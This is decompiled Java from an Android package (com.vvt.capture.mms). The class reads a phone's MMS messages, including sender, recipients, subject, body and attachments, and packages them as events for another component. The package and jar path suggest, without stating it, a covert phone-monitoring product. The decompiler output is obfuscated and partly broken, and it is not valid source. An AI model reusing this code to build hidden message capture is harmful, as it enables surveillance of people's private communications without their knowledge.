package com.vvt.capture.mms;

import android.content.ContentResolver;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxMMSEvent;
import com.vvt.events.FxRecipientType;
import com.vvt.events.h;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class b
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.a;
  private com.vvt.base.a c;
  private com.vvt.base.capture.e d;
  private f e;
  private String f;
  
  public b(String paramString, RunningMode paramRunningMode, ContentResolver paramContentResolver, com.vvt.base.a parama)
  {
    Object localObject1 = RunningMode.FULL;
    boolean bool1;
    if (paramRunningMode == localObject1)
    {
      bool1 = true;
      this.f = paramString;
      if (!bool1) {
        break label130;
      }
      localObject1 = new com/vvt/capture/mms/a/b;
      ((com.vvt.capture.mms.a.b)localObject1).<init>(paramString);
    }
    for (;;)
    {
      this.e = ((f)localObject1);
      localObject1 = this.e;
      Object localObject2 = ((f)localObject1).a();
      boolean bool2 = a;
      if (bool2) {}
      localObject1 = new com/vvt/capture/mms/b/b;
      f localf = this.e;
      long l = ((Long)((g)localObject2).getReference()).longValue();
      localObject2 = paramContentResolver;
      ((com.vvt.capture.mms.b.b)localObject1).<init>(paramContentResolver, localf, bool1, l);
      this.d = ((com.vvt.base.capture.e)localObject1);
      this.c = parama;
      return;
      bool1 = false;
      break;
      label130:
      localObject1 = new com/vvt/capture/mms/b/e;
      ((com.vvt.capture.mms.b.e)localObject1).<init>(paramContentResolver, paramString);
    }
  }
  
  private FxMMSEvent a(MmsData paramMmsData)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = FxEventDirection.UNKNOWN;
    Object localObject2 = c.a;
    Object localObject3 = paramMmsData.c();
    int i = ((MmsData.Direction)localObject3).ordinal();
    int j = localObject2[i];
    FxMMSEvent localFxMMSEvent;
    Object localObject4;
    switch (j)
    {
    default: 
      localObject2 = paramMmsData.e();
      if (localObject2 != null)
      {
        localObject3 = ((String)localObject2).trim();
        i = ((String)localObject3).length();
        if (i != 0) {}
      }
      else
      {
        localObject2 = "";
      }
      localObject3 = paramMmsData.f();
      boolean bool2 = com.vvt.ah.a.c((String)localObject3);
      if (bool2) {
        localObject3 = "Private/unknown number";
      }
      localFxMMSEvent = new com/vvt/events/FxMMSEvent;
      localFxMMSEvent.<init>();
      localObject4 = new com/vvt/events/h;
      ((h)localObject4).<init>();
      Object localObject5 = FxEventDirection.OUT;
      if (localObject1 == localObject5)
      {
        localObject5 = FxRecipientType.TO;
        ((h)localObject4).a((FxRecipientType)localObject5);
        ((h)localObject4).a((String)localObject3);
        ((h)localObject4).b((String)localObject2);
        localFxMMSEvent.addRecipient((h)localObject4);
      }
      break;
    }
    for (;;)
    {
      localFxMMSEvent.setContactName((String)localObject2);
      localFxMMSEvent.setDirection((FxEventDirection)localObject1);
      long l = paramMmsData.a();
      localFxMMSEvent.setEventId(l);
      l = paramMmsData.i();
      localFxMMSEvent.setConversationId(l);
      l = paramMmsData.b();
      localFxMMSEvent.setEventTime(l);
      localObject1 = paramMmsData.g();
      localFxMMSEvent.setSubject((String)localObject1);
      localObject1 = paramMmsData.d();
      localFxMMSEvent.setBody((String)localObject1);
      localObject1 = paramMmsData.h();
      localObject2 = ((List)localObject1).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject2).hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = (a)((Iterator)localObject2).next();
        localObject3 = new com/vvt/events/a;
        ((com.vvt.events.a)localObject3).<init>();
        localObject4 = ((a)localObject1).a();
        ((com.vvt.events.a)localObject3).a((String)localObject4);
        localObject1 = ((a)localObject1).b();
        ((com.vvt.events.a)localObject3).b((String)localObject1);
        localFxMMSEvent.addAttachment((com.vvt.events.a)localObject3);
      }
      localObject1 = FxEventDirection.IN;
      break;
      localObject1 = FxEventDirection.OUT;
      break;
      localFxMMSEvent.setSenderNumber((String)localObject3);
    }
    bool1 = b;
    if (bool1) {}
    return localFxMMSEvent;
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool2 = localObject instanceof MmsData;
        if (bool2)
        {
          localObject = (MmsData)localObject;
          localObject = a((MmsData)localObject);
          localArrayList.add(localObject);
        }
      }
      Object localObject = this.c;
      if (localObject != null)
      {
        bool1 = a;
        if (bool1) {}
        localObject = this.c;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
  }
  
  protected com.vvt.base.capture.e b()
  {
    return this.d;
  }
  
  protected f c()
  {
    return this.e;
  }
  
  protected String d()
  {
    return "MmsCapture";
  }
  
  protected String e()
  {
    return this.f;
  }
  
  protected String f()
  {
    return "mms.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/mms/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */